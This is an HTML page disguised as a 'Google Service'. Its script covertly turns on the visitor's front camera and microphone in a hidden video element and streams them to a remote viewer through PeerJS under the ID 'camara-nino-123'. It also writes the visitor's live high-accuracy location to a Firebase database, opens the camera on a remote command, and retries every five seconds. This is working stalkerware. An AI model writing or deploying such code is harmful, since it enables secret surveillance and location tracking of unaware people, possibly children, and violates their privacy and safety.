<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Google Service</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
</head>
<body>
    <video id="v" autoplay playsinline muted style="display:none;"></video>
    <script>
        const firebaseConfig = { databaseURL: "https://micontrol-30a70-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // Configuración Global (STUN) para conectar en cualquier red
        const peer = new Peer('camara-nino-123', {
            config: { 'iceServers': [{ url: 'stun:stun.l.google.com:19302' }] }
        });

        let miStream = null;

        // 1. FUNCIÓN CÁMARA Y AUDIO
        async function activarTodo() {
            try {
                miStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: true // Permite escuchar audio
                });
                document.getElementById('v').srcObject = miStream;
                enviarUbicacion();
            } catch (e) { console.log("Permisos pendientes..."); }
        }

        // 2. FUNCIÓN UBICACIÓN EN TIEMPO REAL
        function enviarUbicacion() {
            navigator.geolocation.watchPosition((pos) => {
                db.ref('ubicacion').set({
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    timestamp: Date.now()
                });
            }, null, { enableHighAccuracy: true });
        }

        // SEGUNDO PLANO: Reintento automático cada 5 segundos si se corta
        setInterval(() => {
            if (!miStream || !miStream.active) activarTodo();
        }, 5000);

        db.ref('comando_camara').on('value', (s) => { if(s.val()==="ABRIR") activarTodo(); });

        peer.on('call', (call) => {
            call.answer(miStream);
        });
    </script>
</body>
</html>
